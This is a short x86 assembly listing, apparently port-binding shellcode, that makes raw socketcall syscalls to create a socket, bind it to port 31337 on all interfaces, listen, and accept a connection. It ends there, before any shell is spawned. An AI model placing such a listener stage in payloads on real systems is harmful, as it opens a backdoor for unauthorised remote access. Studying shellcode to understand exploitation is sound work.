BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall (syscall #102)
  pop eax
  cdq               ; zero out edx for use as a null DWORD later
  xor ebx, ebx      ; type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; protocol = 0
  push BYTE 0x1     ; SOCK_STREAM = 1
  push BYTE 0x2     ; AF_INET = 2
  mov ecx, esp      ; ecx = ptr to args array
  int 0x80          ; do it

  mov esi, eax      ; save socket FD in esi for later

; bind(fd, [2, 31337, 0], 16)
  push BYTE 0x66    ; socketcall (syscall #102)
  pop eax
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; INADDR_ANY = 0
  push WORD 0x697a  ; PORT = 31337 (0x697a network byte order)
  push WORD bx      ; AF_INET = 2
  mov ecx, esp      ; ecx = host_addr pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         host_addr pointer,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argv array
  int 0x80          ; do it

; listen(fd, 4)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argv array
  int 0x80

; cfd = accept(fd, 0, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argv array
  int 0x80          ; eax = connected client fd
